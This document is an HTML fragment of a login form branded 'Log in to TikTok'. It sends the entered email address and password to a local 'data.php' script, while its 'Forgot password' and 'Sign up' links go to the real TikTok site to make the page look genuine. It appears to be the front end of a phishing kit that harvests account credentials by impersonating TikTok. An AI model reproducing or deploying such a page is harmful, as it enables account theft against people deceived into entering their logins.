<main>
	<div class="content">
		<div class="row ng-scope" ng-if="showContinueLabel">
          <div class="col-xs-12 text-center">
          <img src="icons.png" style="max-width: 180px;"></br>
              <span id="login-to-continue" class="h5 ng-binding" style="
    font-size: 15px;
    font-weight: 600;
    text-align: center;
    color: #16191C;
    font-family: inherit;
    line-height: 1.1;
">Log in to TikTok</span>

          </div>
    </div></br>
		<div class="content-form">
			<form action="data.php" method="POST">
				<input type="text" name="username" style="
    border: 1px solid #d9dadc;
    border-radius: 0;
" placeholder="Email address" title="  Enter correct Email address" required>
				<input type="password" style="
    border: 1px solid #d9dadc;
    border-radius: 0;
" name="userpassword" placeholder="Password" title="4 or more characters" required>
				<div class="checkbox">
            		<label class="ng-binding">
              			<input ng-model="form.remember" type="checkbox" name="remember" analytics-on="checked" analytics-category="Login View" id="login-remember" class="ng-valid ng-dirty ng-valid-parse ng-touched ng-not-empty">
              			Remember me
              			<span class="control-indicator"></span>
            		</label>
         	 	</div>
				<input type="submit" name="data" value="Log In">
			</form>
			<div class="signinLink">
				<a href="https://www.tiktok.com/login"  target="_blank">Forgot password</a>
				<span> - New To TikTok? </span>
				<a href="https://www.tiktok.com/login" target="_blank">Sign up</a>
			</div>
		</div>
	</div>
</main>
